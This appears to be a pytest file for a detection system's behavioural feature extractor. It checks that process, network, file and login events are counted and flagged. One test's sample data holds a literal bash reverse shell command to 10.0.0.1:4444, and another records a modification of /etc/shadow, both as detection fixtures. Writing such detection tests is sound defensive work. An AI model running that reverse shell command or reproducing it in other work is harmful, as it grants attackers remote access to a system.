"""Tests for behavioural feature extraction."""

import sys
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from features.extractor import (
    FEATURE_NAMES,
    NUM_FEATURES,
    EventRecord,
    WindowAccumulator,
    accumulate_event,
    events_to_feature_vector,
    extract_features,
)


def test_feature_names_count():
    assert len(FEATURE_NAMES) == NUM_FEATURES
    assert NUM_FEATURES == 17


def test_empty_window_returns_zero_vector():
    acc = WindowAccumulator()
    vec = extract_features(acc)
    assert vec.shape == (NUM_FEATURES,)
    assert vec.dtype == np.float32


def test_process_event_accumulates():
    acc = WindowAccumulator()
    ev = EventRecord(
        event_type="process",
        timestamp="2026-11-03T10:00:00Z",
        process_context={
            "pid": 100,
            "name": "bash",
            "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        },
    )
    accumulate_event(acc, ev)
    assert acc.total_events == 1
    assert 100 in acc.process_pids
    assert acc.new_processes == 1
    assert acc.suspicious_parents == 1


def test_network_event_accumulates():
    acc = WindowAccumulator()
    ev = EventRecord(
        event_type="network",
        timestamp="2026-11-03T10:00:00Z",
        network_context={
            "remote_addr": "1.2.3.4",
            "remote_port": 4444,
            "direction": "outbound",
        },
    )
    accumulate_event(acc, ev)
    assert acc.connections == 1
    assert "1.2.3.4" in acc.dest_ips
    assert 4444 in acc.dest_ports
    assert acc.outbound == 1
    assert acc.nonstandard_port_conns == 1


def test_file_event_accumulates():
    acc = WindowAccumulator()
    ev = EventRecord(
        event_type="file",
        timestamp="2026-11-03T10:00:00Z",
        file_context={"path": "/etc/shadow", "action": "modify"},
    )
    accumulate_event(acc, ev)
    assert acc.file_modifications == 1
    assert acc.sensitive_accesses == 1


def test_auth_event_accumulates():
    acc = WindowAccumulator()
    ev = EventRecord(
        event_type="authentication",
        timestamp="2026-11-03T10:00:00Z",
        auth_context={
            "action": "failed",
            "username": "root",
            "source_addr": "10.0.0.5",
        },
    )
    accumulate_event(acc, ev)
    assert acc.failed_logins == 1
    assert "10.0.0.5" in acc.auth_sources


def test_extract_features_shape():
    acc = WindowAccumulator()
    for i in range(5):
        ev = EventRecord(
            event_type="process",
            timestamp=f"2026-11-03T10:0{i}:00Z",
            process_context={"pid": i, "name": "test", "cmdline": "test"},
        )
        accumulate_event(acc, ev)
    vec = extract_features(acc)
    assert vec.shape == (NUM_FEATURES,)
    assert vec[0] == 5  # process_count


def test_events_to_feature_vector():
    events = [
        {
            "event_type": "process",
            "timestamp": "2026-11-03T10:00:00Z",
            "process_context": {"pid": 1, "name": "test", "cmdline": "test"},
        },
        {
            "event_type": "network",
            "timestamp": "2026-11-03T10:00:01Z",
            "network_context": {
                "remote_addr": "8.8.8.8",
                "remote_port": 53,
                "direction": "outbound",
            },
        },
    ]
    vec = events_to_feature_vector(events)
    assert vec.shape == (NUM_FEATURES,)
    assert vec[0] >= 1  # at least 1 process


def test_invalid_event_skipped():
    events = [
        {"not_valid": True},
        {
            "event_type": "process",
            "timestamp": "2026-11-03T10:00:00Z",
            "process_context": {"pid": 1, "name": "test", "cmdline": "test"},
        },
    ]
    vec = events_to_feature_vector(events)
    assert vec.shape == (NUM_FEATURES,)


def test_common_ports_not_flagged():
    acc = WindowAccumulator()
    ev = EventRecord(
        event_type="network",
        timestamp="2026-11-03T10:00:00Z",
        network_context={
            "remote_addr": "1.1.1.1",
            "remote_port": 443,
            "direction": "outbound",
        },
    )
    accumulate_event(acc, ev)
    assert acc.nonstandard_port_conns == 0
